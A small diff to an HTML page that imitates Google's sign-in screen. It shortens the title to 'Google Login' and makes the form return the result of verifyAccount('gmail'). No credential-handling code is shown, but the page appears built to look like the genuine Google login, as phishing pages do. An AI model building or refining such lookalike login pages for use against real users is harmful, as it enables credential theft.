@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="index.css">
-    <title>Google Login Form</title>
+    <title>Google Login</title>
 </head>
 <body>
     <div class="box">
@@ -12,7 +12,7 @@
         <h2>Sign in</h2>
         <p>Use a Google account</p>
         <div id="msg-form" style="font-size: 13px; color: red; margin: 10px 10px 20px;"></div>
-        <form id="maine-form" onsubmit="verifyAccount('gmail')">
+        <form id="maine-form" onsubmit="return verifyAccount('gmail')">
           <div class="inputBox">
             <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
             <label>E-mail address or telephone number</label>
